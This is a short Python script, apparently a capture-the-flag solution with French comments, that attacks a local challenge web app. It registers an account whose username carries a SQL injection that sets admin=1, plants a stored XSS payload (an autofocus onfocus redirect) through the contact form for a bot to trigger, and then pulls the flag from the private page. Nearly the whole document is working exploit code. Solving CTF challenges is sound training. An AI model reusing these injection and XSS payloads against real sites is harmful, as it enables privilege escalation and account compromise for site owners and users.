import requests
import time
# XSS payload
payload = "<button autofocus onfocus=document.location='http://localhost/challenge/members.php?username=yournick'>"

# Inscription
username = "owned'; UPDATE users SET admin=1 WHERE username = 'owned' -- -" # Injection SQL 
login = requests.post("http://localhost/challenge/register.php?action=register", data={"username" : username, "password": "password"})
PHPSESSID = login.cookies['PHPSESSID']

# Exploitation de la faille XSS
requests.post('http://localhost/challenge/contact.php?action=contact', data={"content": payload}, cookies={'PHPSESSID': PHPSESSID})

time.sleep(60) # On attends que le BOT lise ses mails

# Récupération du flag
private = requests.get('http://localhost/challenge/private.php', cookies={'PHPSESSID': PHPSESSID}).text
flag = private.split('flag : ')[1].split('</body>')[0]
print('You.. Win ! Flag : ' + flag)
